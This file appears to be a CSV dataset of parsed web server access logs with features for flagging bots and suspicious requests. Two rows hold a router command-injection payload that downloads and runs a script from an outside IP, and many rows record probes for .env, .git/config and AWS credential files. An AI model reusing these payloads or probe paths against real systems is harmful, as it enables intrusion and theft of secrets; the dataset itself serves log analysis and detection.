,IP,Date,Time,Time_zone,Request_method,Path,Protocol,Response_code,Response_size,Referrer,User_Agent,dotfile_access,bad_user_agent,no_referrer,suspicious_path,is_bot,ua_browser,ua_os,ua_is_mobile,ua_is_pc
0,185.218.86.4,09/May/2025,00:07:20,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",0,0,1,0,0,Edge,Windows,0.0,1.0
1,45.95.147.209,09/May/2025,00:14:13,0000,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F212.81.47.226%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60),HTTP/1.1,404,162,,Go-http-client/1.1,0,0,1,0,0,Other,Other,0.0,0.0
2,185.247.137.160,09/May/2025,00:16:26,0000,GET,/,HTTP/1.1,200,396,,Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/),0,0,1,0,0,Other,Other,0.0,0.0
3,154.81.156.7,09/May/2025,00:22:13,0000,GET,/,HTTP/1.1,200,612,,,0,1,1,0,1,Other,Other,,
4,198.235.24.17,09/May/2025,00:24:21,0000,GET,/,HTTP/1.1,200,396,,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com",0,1,1,0,1,Other,Other,0.0,0.0
5,154.81.156.35,09/May/2025,00:31:49,0000,GET,/,HTTP/1.1,200,612,,curl/7.81.0,0,1,1,0,1,Other,Other,0.0,0.0
6,185.218.84.178,09/May/2025,00:34:43,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",0,0,1,0,0,Edge,Windows,0.0,1.0
7,20.163.34.74,09/May/2025,00:52:42,0000,GET,/,HTTP/1.1,200,396,,Mozilla/5.0 zgrab/0.x,0,0,1,0,0,Other,Other,0.0,0.0
8,198.235.24.142,09/May/2025,01:31:53,0000,GET,/,HTTP/1.0,200,612,,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com",0,1,1,0,1,Other,Other,0.0,0.0
9,78.153.140.147,09/May/2025,01:35:43,0000,GET,/.env,HTTP/1.1,404,197,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36",1,0,1,0,1,Chrome,Windows,0.0,1.0
10,78.153.140.147,09/May/2025,01:35:43,0000,POST,/,HTTP/1.1,405,568,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
11,176.65.148.243,09/May/2025,01:40:16,0000,POST,/boaform/admin/formLogin,HTTP/1.1,404,134,http://20.255.50.20:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,0,0,0,1,1,Firefox,Ubuntu,0.0,1.0
12,45.84.143.10,09/May/2025,01:55:42,0000,GET,/,HTTP/1.0,200,612,,curl/7.88.1,0,1,1,0,1,Other,Other,0.0,0.0
13,202.5.37.203,09/May/2025,01:57:15,0000,GET,/,HTTP/1.1,200,612,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
14,176.65.148.243,09/May/2025,02:30:34,0000,GET,/,HTTP/1.1,200,396,,Linux Gnu (cow),0,0,1,0,0,Other,Linux,0.0,0.0
15,103.17.51.100,09/May/2025,02:36:02,0000,GET,/,HTTP/1.1,200,612,,Hello-World/1.0,0,0,1,0,0,Other,Other,0.0,0.0
17,80.82.77.202,09/May/2025,03:19:31,0000,GET,/,HTTP/1.0,200,612,,"Mozilla/5.0 (Linux; Android 9; rv:75.0.3770.67) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36",0,0,1,0,0,Chrome Mobile,Android,1.0,0.0
19,205.210.31.199,09/May/2025,03:36:41,0000,GET,/,HTTP/1.0,200,612,,"Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com",0,1,1,0,1,Other,Other,0.0,0.0
21,152.53.248.175,09/May/2025,04:01:48,0000,CONNECT,www.google.com:443,HTTP/1.1,400,166,,,0,1,1,0,1,Other,Other,,
22,65.49.1.15,09/May/2025,04:03:56,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
23,65.49.1.16,09/May/2025,04:05:27,0000,GET,/webui/,HTTP/1.1,404,197,,"Mozilla/5.0 (X11; CrOS x86_64 14541.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",0,0,1,0,0,Chrome,Other,0.0,1.0
24,65.49.1.21,09/May/2025,04:07:30,0000,GET,/favicon.ico,HTTP/1.1,404,197,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",0,0,1,0,0,Chrome,Linux,0.0,1.0
25,65.49.1.11,09/May/2025,04:08:07,0000,GET,/geoserver/web/,HTTP/1.1,404,197,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
28,20.65.193.213,09/May/2025,04:59:50,0000,GET,/hudson,HTTP/1.1,404,134,,Mozilla/5.0 zgrab/0.x,0,0,1,0,0,Other,Other,0.0,0.0
30,104.234.115.219,09/May/2025,05:07:04,0000,GET,/,HTTP/1.0,200,612,,'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)',0,1,1,0,1,Other,Other,0.0,0.0
31,195.211.191.76,09/May/2025,05:08:07,0000,GET,/.git/HEAD,HTTP/1.1,404,197,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36",1,0,1,0,1,Chrome,Mac OS X,0.0,1.0
32,104.234.115.219,09/May/2025,05:11:14,0000,GET,/,HTTP/1.1,200,396,,'Mozilla/5.0 (compatible; GenomeCrawlerd/1.0; +https://www.nokia.com/genomecrawler)',0,1,1,0,1,Other,Other,0.0,0.0
33,43.157.38.228,09/May/2025,05:12:16,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",0,0,1,0,0,Other,iOS,1.0,0.0
34,112.185.162.84,09/May/2025,05:13:41,0000,GET,/,HTTP/1.0,200,612,,curl/7.88.1,0,1,1,0,1,Other,Other,0.0,0.0
35,188.166.191.108,09/May/2025,05:26:00,0000,GET,/.env,HTTP/1.1,404,134,,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,1,0,1,0,1,Other,Other,0.0,0.0
36,188.166.191.108,09/May/2025,05:26:01,0000,GET,/.git/config,HTTP/1.1,404,134,,Mozilla/5.0; Keydrop.io/1.0(onlyscans.com/about);,1,0,1,1,1,Other,Other,0.0,0.0
38,68.69.186.226,09/May/2025,06:24:44,0000,POST,/boaform/admin/formLogin,HTTP/1.1,404,134,http://20.255.50.20:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,0,0,0,1,1,Firefox,Ubuntu,0.0,1.0
40,20.65.201.33,09/May/2025,07:10:54,0000,GET,/manager/html,HTTP/1.1,404,134,,Mozilla/5.0 zgrab/0.x,0,0,1,0,0,Other,Other,0.0,0.0
41,159.253.120.209,09/May/2025,07:18:00,0000,GET,/phpmyadmin/scripts/setup.php,HTTP/1.1,404,162,,Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en],0,0,1,1,1,Opera,Windows,0.0,1.0
42,159.253.120.209,09/May/2025,07:18:01,0000,POST,/phpmyadmin/scripts/setup.php,HTTP/1.1,404,162,http://20.255.50.20/phpmyadmin/scripts/setup.php,Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.01 [en],0,0,0,1,1,Opera,Windows,0.0,1.0
43,43.157.53.115,09/May/2025,07:22:26,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",0,0,1,0,0,Other,iOS,1.0,0.0
45,195.178.110.224,09/May/2025,07:47:54,0000,GET,/,HTTP/1.1,200,612,,Hello World,0,0,1,0,0,Other,Other,0.0,0.0
47,180.254.116.14,09/May/2025,08:06:22,0000,GET,/,HTTP/1.1,200,612,,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",0,0,1,0,0,Other,Mac OS X,0.0,1.0
49,109.74.196.231,09/May/2025,08:35:43,0000,GET,/,HTTP/1.1,200,396,,Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0,0,0,1,0,0,Firefox,Windows,0.0,1.0
51,115.65.169.36,09/May/2025,09:06:19,0000,GET,/,HTTP/1.0,200,612,,curl/7.88.1,0,1,1,0,1,Other,Other,0.0,0.0
52,196.251.86.175,09/May/2025,09:16:09,0000,GET,/.env,HTTP/1.1,404,197,,"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3724.8 Safari/537.36",1,0,1,0,1,Chrome,Windows,0.0,1.0
53,79.7.229.172,09/May/2025,09:19:26,0000,GET,/,HTTP/1.0,200,612,,,0,1,1,0,1,Other,Other,,
54,206.168.34.195,09/May/2025,09:22:26,0000,GET,/,HTTP/1.1,200,396,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),0,1,1,0,1,Other,Other,0.0,0.0
55,206.168.34.195,09/May/2025,09:22:37,0000,GET,/favicon.ico,HTTP/1.1,404,134,,Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/),0,1,1,0,1,Other,Other,0.0,0.0
56,206.168.34.195,09/May/2025,09:22:42,0000,PRI,*,HTTP/2.0,400,166,,,0,1,1,0,1,Other,Other,,
59,4.227.178.199,09/May/2025,10:34:28,0000,GET,/developmentserver/metadatauploader,HTTP/1.1,404,134,,Mozilla/5.0 zgrab/0.x,0,0,1,0,0,Other,Other,0.0,0.0
60,45.135.194.53,09/May/2025,10:34:57,0000,GET,/,HTTP/1.1,200,612,,,0,1,1,0,1,Other,Other,,
61,121.179.77.196,09/May/2025,10:52:24,0000,GET,/,HTTP/1.0,200,612,,curl/7.88.1,0,1,1,0,1,Other,Other,0.0,0.0
64,43.129.58.235,09/May/2025,11:41:46,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",0,0,1,0,0,Other,iOS,1.0,0.0
70,122.173.31.204,09/May/2025,13:04:36,0000,GET,/,HTTP/1.1,200,51,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
71,122.173.31.204,09/May/2025,13:04:37,0000,GET,/favicon.ico,HTTP/1.1,404,184,http://ai-log-analyser.eastasia.cloudapp.azure.com/,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",0,0,0,0,0,Chrome,Windows,0.0,1.0
80,45.156.131.25,09/May/2025,13:21:05,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
81,45.156.131.24,09/May/2025,13:21:05,0000,GET,/favicon.ico,HTTP/1.1,404,197,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
82,59.91.40.196,09/May/2025,13:37:17,0000,GET,/,HTTP/1.1,200,612,,Hello-World/1.0,0,0,1,0,0,Other,Other,0.0,0.0
85,43.130.139.136,09/May/2025,13:47:07,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",0,0,1,0,0,Other,iOS,1.0,0.0
86,179.43.152.115,09/May/2025,14:11:12,0000,GET,/,HTTP/1.1,400,166,,,0,1,1,0,1,Other,Other,,
87,179.43.152.115,09/May/2025,14:11:12,0000,GET,/,HTTP/1.1,200,612,,l9tcpid/v1.1.0,0,0,1,0,0,Other,Other,0.0,0.0
88,179.43.152.115,09/May/2025,14:11:13,0000,GET,/.env.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
89,179.43.152.115,09/May/2025,14:11:13,0000,GET,/data/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
90,179.43.152.115,09/May/2025,14:11:13,0000,GET,/admin/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
91,179.43.152.115,09/May/2025,14:11:14,0000,GET,/.env.prod.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
92,179.43.152.115,09/May/2025,14:11:14,0000,GET,/.envrc,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
93,179.43.152.115,09/May/2025,14:11:14,0000,GET,/config/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
94,179.43.152.115,09/May/2025,14:11:15,0000,GET,/cms/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
95,179.43.152.115,09/May/2025,14:11:15,0000,GET,/.aws/credentials,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
96,179.43.152.115,09/May/2025,14:11:15,0000,GET,/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
97,179.43.152.115,09/May/2025,14:11:16,0000,GET,/.env.config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
98,179.43.152.115,09/May/2025,14:11:16,0000,GET,/.env.preprod,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
99,179.43.152.115,09/May/2025,14:11:16,0000,GET,/assets../.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
100,179.43.152.115,09/May/2025,14:11:17,0000,GET,/.env.backup,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
101,179.43.152.115,09/May/2025,14:11:17,0000,GET,/.env.ci,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
102,179.43.152.115,09/May/2025,14:11:18,0000,GET,/.env.save,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
103,179.43.152.115,09/May/2025,14:11:18,0000,GET,/prod/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
104,179.43.152.115,09/May/2025,14:11:18,0000,GET,/.env.dev,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
105,179.43.152.115,09/May/2025,14:11:19,0000,GET,/.env.prod,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
106,179.43.152.115,09/May/2025,14:11:19,0000,GET,/.env.production,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
107,179.43.152.115,09/May/2025,14:11:19,0000,GET,/.env.qa,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
108,179.43.152.115,09/May/2025,14:11:20,0000,GET,/server/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
109,179.43.152.115,09/May/2025,14:11:20,0000,GET,/src/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
110,179.43.152.115,09/May/2025,14:11:20,0000,GET,/config.json,HTTP/1.1,404,134,,l9explore/1.2.2,0,0,1,1,1,Other,Other,0.0,0.0
111,179.43.152.115,09/May/2025,14:11:21,0000,GET,/.env.secret,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
112,179.43.152.115,09/May/2025,14:11:21,0000,GET,/.env.stage,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
113,179.43.152.115,09/May/2025,14:11:21,0000,GET,/docker-compose.prod.yml,HTTP/1.1,404,134,,l9explore/1.2.2,0,0,1,0,0,Other,Other,0.0,0.0
114,179.43.152.115,09/May/2025,14:11:22,0000,GET,/.env.dist,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
115,179.43.152.115,09/May/2025,14:11:22,0000,GET,/configuration/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
116,179.43.152.115,09/May/2025,14:11:23,0000,GET,/app/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
117,179.43.152.115,09/May/2025,14:11:23,0000,GET,/api/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
118,179.43.152.115,09/May/2025,14:11:23,0000,GET,/media/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
119,179.43.152.115,09/May/2025,14:11:24,0000,GET,/.env.template,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
120,179.43.152.115,09/May/2025,14:11:24,0000,GET,/core/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
121,179.43.152.115,09/May/2025,14:11:24,0000,GET,/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
122,179.43.152.115,09/May/2025,14:11:25,0000,GET,/.env.default,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
123,179.43.152.115,09/May/2025,14:11:25,0000,GET,/settings/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
124,179.43.152.115,09/May/2025,14:11:25,0000,GET,/.env.testing,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
125,179.43.152.115,09/May/2025,14:11:26,0000,GET,/backup/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
126,179.43.152.115,09/May/2025,14:11:26,0000,GET,/www/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
127,179.43.152.115,09/May/2025,14:11:27,0000,GET,/.env.test,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
128,179.43.152.115,09/May/2025,14:11:27,0000,GET,/files/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
129,179.43.152.115,09/May/2025,14:11:27,0000,GET,/project/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
130,179.43.152.115,09/May/2025,14:11:28,0000,GET,/.env.dev.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
131,179.43.152.115,09/May/2025,14:11:28,0000,GET,/.env.live,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
132,179.43.152.115,09/May/2025,14:11:28,0000,GET,/.env.production.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
133,179.43.152.115,09/May/2025,14:11:29,0000,GET,/api/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
134,179.43.152.115,09/May/2025,14:11:29,0000,GET,/.env.uat,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
135,179.43.152.115,09/May/2025,14:11:29,0000,GET,/public/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
136,179.43.152.115,09/May/2025,14:11:30,0000,GET,/static../.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
137,179.43.152.115,09/May/2025,14:11:30,0000,GET,/dev/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
138,179.43.152.115,09/May/2025,14:11:30,0000,GET,/.env_sample,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
139,179.43.152.115,09/May/2025,14:11:31,0000,GET,/.env.development.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
140,179.43.152.115,09/May/2025,14:11:31,0000,GET,/.env.staging.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
141,179.43.152.115,09/May/2025,14:11:32,0000,GET,/.env.testing.local,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
142,179.43.152.115,09/May/2025,14:11:32,0000,GET,/config/.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
143,179.43.152.115,09/May/2025,14:11:32,0000,GET,/.env.bak,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
144,179.43.152.115,09/May/2025,14:11:33,0000,GET,/.env.sandbox,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
145,179.43.152.115,09/May/2025,14:11:33,0000,GET,/build/.env,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,0,1,Other,Other,0.0,0.0
146,179.43.152.115,09/May/2025,14:11:33,0000,GET,/media../.git/config,HTTP/1.1,404,134,,l9explore/1.2.2,1,0,1,1,1,Other,Other,0.0,0.0
148,195.211.191.76,09/May/2025,14:15:38,0000,GET,/.git/refs/,HTTP/1.1,404,197,,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.158 Safari/537.36 Vivaldi/2.5.1525.43",1,0,1,0,1,Other,Linux,0.0,1.0
151,45.156.131.24,07/May/2025,08:33:34,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
152,93.174.93.12,07/May/2025,08:39:26,0000,GET,/,HTTP/1.0,200,612,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",0,0,1,0,0,Chrome,Windows,0.0,1.0
154,154.81.156.35,07/May/2025,08:58:54,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46",0,0,1,0,0,Edge,Windows,0.0,1.0
155,43.159.152.187,07/May/2025,09:04:38,0000,GET,/,HTTP/1.1,200,396,,"Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1",0,0,1,0,0,Other,iOS,1.0,0.0
156,141.98.11.128,07/May/2025,09:24:13,0000,GET,/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+sh%3B+wget+http%3A%2F%2F212.81.47.226%2Fsh%3B+chmod+777+sh%3B+.%2Fsh+tplink%3B+rm+-rf+sh%60),HTTP/1.1,404,162,,Go-http-client/1.1,0,0,1,0,0,Other,Other,0.0,0.0
159,122.173.31.204,07/May/2025,09:43:29,0000,GET,/,HTTP/1.1,200,396,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0,0,0,1,0,0,Firefox,Ubuntu,0.0,1.0
160,122.173.31.204,07/May/2025,09:43:29,0000,GET,/favicon.ico,HTTP/1.1,404,134,http://ai-log-analyser.eastasia.cloudapp.azure.com/,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0,0,0,0,0,0,Firefox,Ubuntu,0.0,1.0
161,122.173.31.204,07/May/2025,10:11:37,0000,GET,/,HTTP/1.1,304,0,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0,0,0,1,0,0,Firefox,Ubuntu,0.0,1.0
163,176.65.148.227,07/May/2025,10:16:14,0000,POST,/boaform/admin/formLogin,HTTP/1.1,404,134,http://20.255.50.20:80/admin/login.asp,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0,0,0,0,1,1,Firefox,Ubuntu,0.0,1.0
165,195.184.76.76,07/May/2025,11:17:19,0000,GET,/,HTTP/1.1,200,612,,Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:134.0) Gecko/20100101 Firefox/134.0,0,0,1,0,0,Firefox,Ubuntu,0.0,1.0
